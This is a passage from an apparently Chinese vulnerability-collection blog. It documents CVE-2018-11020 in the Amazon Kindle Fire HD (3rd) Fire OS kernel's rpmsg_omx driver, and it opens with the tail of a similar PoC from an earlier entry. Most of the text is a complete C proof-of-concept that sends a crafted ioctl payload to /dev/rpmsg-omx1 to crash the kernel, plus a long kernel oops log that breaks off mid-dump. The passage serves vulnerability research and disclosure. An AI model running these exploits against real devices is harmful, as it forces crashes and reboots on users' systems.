  <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x001001ff</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0xff1f0512</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x51e32167</span>,</span><br><span class="line">    <span class="number">0xc18c55cc</span>,</span><br><span class="line">    <span class="number">0x00000000</span>,</span><br><span class="line">    <span class="number">0xffffffff</span>,</span><br><span class="line">    <span class="number">0xb4aaf12b</span>,</span><br><span class="line">    <span class="number">0x86edfdbd</span>,</span><br><span class="line">    <span class="number">0x00000010</span>,</span><br><span class="line">    <span class="number">0x0000003f</span>,</span><br><span class="line">    <span class="number">0xabff7b00</span>,</span><br><span class="line">    <span class="number">0xffff9ea3</span>,</span><br><span class="line">    <span class="number">0xb28e0040</span>,</span><br><span class="line">    <span class="number">0x000fffff</span>,</span><br><span class="line">    <span class="number">0x458603f4</span>,</span><br><span class="line">    <span class="number">0xffff007f</span>,</span><br><span class="line">    <span class="number">0xa9030f02</span>,</span><br><span class="line">    <span class="number">0x00000001</span>,</span><br><span class="line">    <span class="number">0x002cffff</span>,</span><br><span class="line">    <span class="number">0x9e00cdff</span>,</span><br><span class="line">    <span class="number">0x00000004</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span>,</span><br><span class="line">    <span class="number">0x41414141</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<p>To be added here.</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-09-12T15:12:11.000Z" title="2020-09-12T15:12:11.000Z">2020-09-12</time></span><span class="level-item">Updated&nbsp;<time dateTime="2020-09-12T15:15:56.440Z" title="2020-09-12T15:15:56.440Z">2020-09-12</time></span><span class="level-item"><a class="link-muted" href="/categories/IOT/">IOT</a></span><span class="level-item">17 minutes read (About 2496 words)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2020/09/12/IOT/Exploit/Amazon%20Kindle%20Fire%20HD(3rd)/%EF%BC%88CVE-2018-11020%EF%BC%89Amazon-Kindle-Fire-HD-3rd-Fire-OS-kernel%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">（CVE-2018-11020）Amazon Kindle Fire HD (3rd) Fire OS kernel组件安全漏洞</a></h1><div class="content"><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><blockquote>
<p>Amazon Kindle Fire HD（3rd）Fire OS 4.5.5.3内核组件中的内核模块/omap/drivers/rpmsg/rpmsg_omx.c允许攻击者通过设备文件/ dev / rpmsg-上的ioctl的参数注入特制的参数使用命令<strong>3221772291的omx1</strong>，并导致内核崩溃。</p>
<p>要探索此漏洞，必须打开设备文件/ dev / rpmsg-omx1，并使用命令<strong>3221772291</strong>和精心设计的有效负载作为第三个参数来对该设备文件进行ioctl系统调用。</p>
</blockquote>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Fire OS 4.5.5.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>poc</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is poc of Kindle Fire HD 3rd</span></span><br><span class="line"><span class="comment"> * A bug in the ioctl interface of device file /dev/rpmsg-omx1 causes the system crash via IOCTL 3221772291.</span></span><br><span class="line"><span class="comment"> * Related buggy struct name is gcicommit.</span></span><br><span class="line"><span class="comment"> * This Poc should run with permission to do ioctl on /dev/rpmsg-omx1.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The fowllwing is kmsg of kernel crash infomation:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">static</span> <span class="keyword">char</span> *driver = <span class="string">&quot;/dev/rpmsg-omx1&quot;</span>;</span><br><span class="line"><span class="keyword">static</span> command = <span class="number">3221772291</span>; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> payload[] = &#123; <span class="number">0xb5d18de2</span>, <span class="number">0xf6e48a17</span>, <span class="number">0x9179c429</span>, <span class="number">0x89a32e03</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> fd = <span class="number">0</span>;</span><br><span class="line">        fd = open(driver, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Failed to open %s, with errno %d\n&quot;</span>, driver, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 1 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Try open %s with command 0x%x.\n&quot;</span>, driver, command);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;System will crash and reboot.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(ioctl(fd, command, &amp;payload) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Allocation of structs failed, %d\n&quot;</span>, errno);</span><br><span class="line">            system(<span class="string">&quot;echo 2 &gt; /data/local/tmp/log&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        close(fd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line">[  146.290710] Unable to handle kernel paging request at virtual address b5d18de6</span><br><span class="line">[  146.299438] pgd &#x3D; d72dc000</span><br><span class="line">[  146.302795] [b5d18de6] *pgd&#x3D;00000000</span><br><span class="line">[  146.307281] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[  146.313232] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  146.320983] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  146.328308] PC is at ion_free+0xc&#x2F;0xb4</span><br><span class="line">[  146.332672] LR is at rpmsg_omx_ioctl+0x2cc&#x2F;0x598</span><br><span class="line">[  146.337890] pc : [&lt;c02e8540&gt;]    lr : [&lt;c048a120&gt;]    psr: 60000013</span><br><span class="line">[  146.337890] sp : c35b5e60  ip : c35b5e80  fp : c35b5e7c</span><br><span class="line">[  146.350860] r10: c35b5ea8  r9 : de88c4d8  r8 : c35b4000</span><br><span class="line">[  146.356872] r7 : dd32b580  r6 : 00000003  r5 : d71d5880  r4 : be92f5f8</span><br><span class="line">[  146.364135] r3 : d71d58ec  r2 : d71d58ec  r1 : b5d18de2  r0 : d7aaaa00</span><br><span class="line">[  146.371551] Flags: nZCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  146.379516] Control: 10c5387d  Table: 972dc04a  DAC: 00000015</span><br><span class="line">[  146.386077] </span><br><span class="line">[  146.386077] PC: 0xc02e84c0:</span><br><span class="line">[  146.391052] 84c0  0a000001 e2871010 ebfddc25 e1a00006 eb0ee904 e5953058 e2433001 e5853058</span><br><span class="line">[  146.401580] 84e0  e3530000 ba000011 1a000009 e1a0200d e3c23d7f e3c3303f e285005c e593300c</span><br><span class="line">[  146.412292] 8500  e593723c e1a01007 ebf90a76 e597321c e585306c e1a00006 eb0ee876 e1a00005</span><br><span class="line">[  146.422821] 8520  ebffffb4 e1a00004 ebf8e011 e89da8f0 e7f001f2 e1a0c00d e92dd878 e24cb004</span><br><span class="line">[  146.433502] 8540  e5915004 e1a04001 e1550000 1a000021 e2856014 e1a00006 eb0ee8e2 e5953010</span><br><span class="line">[  146.444183] 8560  e3530000 0a000005 e243200c e1540002 2a00000a e5933008 e3530000 1afffff9</span><br><span class="line">[  146.454864] 8580  e59f0054 e3001219 e59f2050 e59f3050 ebf58268 e1a00006 eb0ee856 e89da878</span><br><span class="line">[  146.465393] 85a0  85933004 8affffed f57ff05f e1943f9f e2433001 e1842f93 e3320000 1afffffa</span><br><span class="line">[  146.476074] </span><br><span class="line">[  146.476074] LR: 0xc048a0a0:</span><br><span class="line">[  146.481048] a0a0  33a03000 e3530000 1affffae e24ba05c e1a01004 e3a02008 e1a0000a ebf7305e</span><br><span class="line">[  146.491729] a0c0  e3500000 1affffaa e5950068 e51b1058 ebf97677 e3500000 e50b005c 0a000001</span><br><span class="line">[  146.502380] a0e0  e3700a01 9affffc8 e3a03000 e50b305c eaffffc5 e3e00018 eaffff8e e1a00004</span><br><span class="line">[  146.513061] a100  e1a0100a e3a02008 ebf73154 e3500000 0affff88 eaffffc2 e5950068 ebf97904</span><br><span class="line">[  146.523590] a120  eaffffb9 e24b005c e3a01030 ebf7398b e3a02030 e597003c e1a03006 e58d2000</span><br><span class="line">[  146.534240] a140  e59f1280 e59f2274 ebf99069 e3e0000d eaffff78 e5933004 e7933101 e3530000</span><br><span class="line">[  146.544921] a160  0affff6c e5950068 ebf97651 e2509000 0a000021 e3790a01 8a00001f e5950068</span><br><span class="line">[  146.555603] a180  e1a01009 e24b2064 e24b3060 ebf97447 e3500000 050b905c 0affff9b e59f322c</span><br><span class="line">[  146.566131] </span><br><span class="line">[  146.566131] SP: 0xc35b5de0:</span><br><span class="line">[  146.571228] 5de0  00000004 d8cc50f4 60010013 00000001 00000001 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.581787] 5e00  c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2</span><br><span class="line">[  146.592437] 5e20  d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8</span><br><span class="line">[  146.603118] 5e40  c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.613830] 5e60  d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  146.624389] 5e80  c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  146.635070] 5ea0  c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  146.645599] 5ec0  00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  146.656158] </span><br><span class="line">[  146.656158] IP: 0xc35b5e00:</span><br><span class="line">[  146.661254] 5e00  c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00 b5d18de2</span><br><span class="line">[  146.671936] 5e20  d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8</span><br><span class="line">[  146.682495] 5e40  c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff</span><br><span class="line">[  146.693176] 5e60  d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120 c02e8540</span><br><span class="line">[  146.703704] 5e80  c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4 c35b5ea8</span><br><span class="line">[  146.714263] 5ea0  c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000 c35b5f14</span><br><span class="line">[  146.724914] 5ec0  00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc 00000000</span><br><span class="line">[  146.735595] 5ee0  d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74 c35b5f08</span><br><span class="line">[  146.746276] </span><br><span class="line">[  146.746276] FP: 0xc35b5dfc:</span><br><span class="line">[  146.751251] 5dfc  ffffffff c35b5e4c c35b4000 c35b5e7c c35b5e18 c06a5318 c0008370 d7aaaa00</span><br><span class="line">[  146.761779] 5e1c  b5d18de2 d71d58ec d71d58ec be92f5f8 d71d5880 00000003 dd32b580 c35b4000</span><br><span class="line">[  146.772308] 5e3c  de88c4d8 c35b5ea8 c35b5e7c c35b5e80 c35b5e60 c048a120 c02e8540 60000013</span><br><span class="line">[  146.783020] 5e5c  ffffffff d71d58ec be92f5f8 d71d5880 00000003 c35b5f04 c35b5e80 c048a120</span><br><span class="line">[  146.793701] 5e7c  c02e8540 c35b5edc c35b5e90 c0207454 c00bd920 0000001e d7333e40 c35b5ed4</span><br><span class="line">[  146.804382] 5e9c  c35b5ea8 c00723a0 000fffff b5d18de2 f6e48a17 00000002 00000001 00000000</span><br><span class="line">[  146.814941] 5ebc  c35b5f14 00000000 00000001 de88c4d8 c25d7c00 c35b5efc c35b5ee0 c02089fc</span><br><span class="line">[  146.825592] 5edc  00000000 d72400c0 00000004 d72400c0 be92f5f8 de88c4d8 00000000 c35b5f74</span><br><span class="line">[  146.836242] </span><br><span class="line">[  146.836242] R0: 0xd7aaa980:</span><br><span class="line">[  146.841217] a980  00000001 00000001 00000000 00000000 00004007 00000000 00000000 00000000</span><br><span class="line">[  146.851898] a9a0  00000020 00000000 00000000 00000000 00000300 d7aaa9b4 d7aaa9b4 c0248d00</span><br><span class="line">[  146.862518] a9c0  00000093 00000093 0000005d 00000002 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.873077] a9e0  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.883728] aa00  d763b780 00000000 00000000 deabb480 00000000 00000001 00000000 00000000</span><br><span class="line">[  146.894409] aa20  d7aaaa20 d7aaaa20 00000000 00000105 c0903054 d7157440 00000f30 dcd4f220</span><br><span class="line">[  146.905090] aa40  00000093 00000003 00000017 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.915618] aa60  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  146.926300] </span><br><span class="line">[  146.926300] R2: 0xd71d586c:</span><br><span class="line">[  146.931274] 586c  00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580</span><br><span class="line">[  146.941955] 588c  d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000</span><br><span class="line">[  146.952636] 58ac  d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000</span><br><span class="line">[  146.963287] 58cc  00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00</span><br><span class="line">[  146.973815] 58ec  d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904</span><br><span class="line">[  146.984497] 590c  00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000</span><br><span class="line">[  146.995147] 592c  00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000</span><br><span class="line">[  147.005676] 594c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.016357] </span><br><span class="line">[  147.016357] R3: 0xd71d586c:</span><br><span class="line">[  147.021453] 586c  00000000 00000000 00000000 00000000 00000000 dd32b5c8 dd32b5c8 dd32b580</span><br><span class="line">[  147.032012] 588c  d71d588c d71d588c 00000000 00000000 00000000 00000001 00000000 00000000</span><br><span class="line">[  147.042663] 58ac  d71d58ac d71d58ac 00000000 00000000 00000000 d71d58c0 d71d58c0 00000000</span><br><span class="line">[  147.053314] 58cc  00000000 00000000 d71d58d4 d71d58d4 d7aaadc0 00000000 00000000 d7aaaa00</span><br><span class="line">[  147.063873] 58ec  d71d58ec d71d58ec 00000000 00000000 00000000 00006a44 d71d5904 d71d5904</span><br><span class="line">[  147.074523] 590c  00000003 d7138510 d725b910 00000000 00000000 d6cf989c 00000001 00000000</span><br><span class="line">[  147.085205] 592c  00000000 6149b660 6149b640 00001fe5 d71d593c d71d593c 00000000 00000000</span><br><span class="line">[  147.095886] 594c  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.106414] </span><br><span class="line">[  147.106445] R5: 0xd71d5800:</span><br><span class="line">[  147.111541] 5800  d71d5d00 00000000 00000000 dcfc4200 f0000009 00000211 00000001 00000001</span><br><span class="line">[  147.122070] 5820  00000000 00001000 00001000 00000004 00000000 d71d5844 c01519dc d89b54c0</span><br><span class="line">[  147.132751] 5840  c01576ac c10dc870 00001000 00000000 c0a10230 c0a10dc0 d1a1dd58 c006f724</span><br><span class="line">[  147.143432] 5860  00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.154083] 5880  dd32b5c8 dd32b5c8 dd32b580 d71d588c d71d588c 00000000 00000000 00000000</span><br><span class="line">[  147.164611] 58a0  00000001 00000000 00000000 d71d58ac d71d58ac 00000000 00000000 00000000</span><br><span class="line">[  147.175140] 58c0  d71d58c0 d71d58c0 00000000 00000000 00000000 d71d58d4 d71d58d4 d7aaadc0</span><br><span class="line">[  147.185821] 58e0  00000000 00000000 d7aaaa00 d71d58ec d71d58ec 00000000 00000000 00000000</span><br><span class="line">[  147.196472] </span><br><span class="line">[  147.196502] R7: 0xdd32b500:</span><br><span class="line">[  147.201446] b500  e2401000 f400f000 0202420f 0000c000 f400f000 dd071d20 00000000 d8f0a680</span><br><span class="line">[  147.212127] b520  d8f0a740 00000000 00000000 00000001 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.222656] b540  00000000 00000000 00000001 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.233184] b560  00000000 00000000 c153f430 00001000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.243865] b580  00000000 dd32b584 dd32b584 00000000 00000000 c0a16c60 00000000 00000002</span><br><span class="line">[  147.254547] b5a0  00000001 00000000 c06faab0 de88c61c de88c61c 0f700001 00000001 d8caa000</span><br><span class="line">[  147.265075] b5c0  dd0f7200 00000001 d71d5880 d71d5880 00000001 00000000 00000000 dd32b5dc</span><br><span class="line">[  147.275756] b5e0  dd32b5dc 00000000 7fffffff 00000000 00000000 dd32b5f4 dd32b5f4 00000000</span><br><span class="line">[  147.286407] </span><br><span class="line">[  147.286407] R8: 0xc35b3f80:</span><br><span class="line">[  147.291381] 3f80  66eff968 00000000 000000f0 c0013e08 c35b2000 00000000 00000000 c35b3fa8</span><br><span class="line">[  147.302032] 3fa0  c0013c60 c009a164 66eff978 66eff968 66eff978 00000080 00000000 00000000</span><br><span class="line">[  147.312713] 3fc0  66eff978 66eff968 00000000 000000f0 00000000 00000000 00000000 41d1f6a8</span><br><span class="line">[  147.323272] 3fe0  00000000 6716ebc8 400710f8 40083b80 600f0010 66eff978 00760061 00000061</span><br><span class="line">[  147.333923] 4000  00000000 00000002 00000000 d7157440 c0a0e840 00000000 00000015 d726ee00</span><br><span class="line">[  147.344604] 4020  d8d2c700 c35b4000 c09ddc50 d7157440 d8db57c0 c1617b40 c35b5b4c c35b5a98</span><br><span class="line">[  147.355133] 4040  c06a36e4 00000000 00000000 00000000 00000000 00000000 01000000 00000000</span><br><span class="line">[  147.365814] 4060  0087d4c0 5ebfe27f 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.376464] </span><br><span class="line">[  147.376495] R9: 0xde88c458:</span><br><span class="line">[  147.381469] c458  de88c458 de88c458 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  147.392150] c478  00000000 00000000 de88c480 de88c480 00000000 de88c48c de88c48c 00000000</span><br><span class="line">[  147.402801] c498  5aefcde6 00000000 00000000 00000000 de88c4b0 28cfd730 00000000 00000000</span><br><span class="line">[  147.413330] c4b8  00200000 00000000 00000000 de88c4c4 de88c4c4 d8cbdf00 d8cbdf00 00000000</span><br><span class="line">[  147.424011] c4d8  000521b0 00000402 00000402 00000000 00000000 00000000 c06b9600 dd160400</span><br><span class="line">[  147.434661] c4f8  de88c5b0 d8c81030 00000f98 00000001 0f700001 5aefcde6 199c82ca 5aefcde6</span><br><span class="line">[  147.445312] c518  199c82ca 5aefcde6 199c82ca 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  147.455871] c538  00000000 00000000 00000000 00000000 00000001 00000000 00000000 de88c554</span><br><span class="line">[  147.466522] </span><br><span class="line">[  147.466522] R10: 0xc35b5e28:</span><br><span class="line">[  147.471588] 5e28  be92f5f8 d71d5880 00000003 dd32b580 c35b4000 de88c4d8 c35b5ea8 c35b5e7c</span><br><span class="line">[  147.482269] 5e48  c35b5e80 c35b5e60 c048a120 c02e8540 60000013 ffffffff d71d58ec be92f5f8</span><br><span class="line">[  147.492950] 5e68  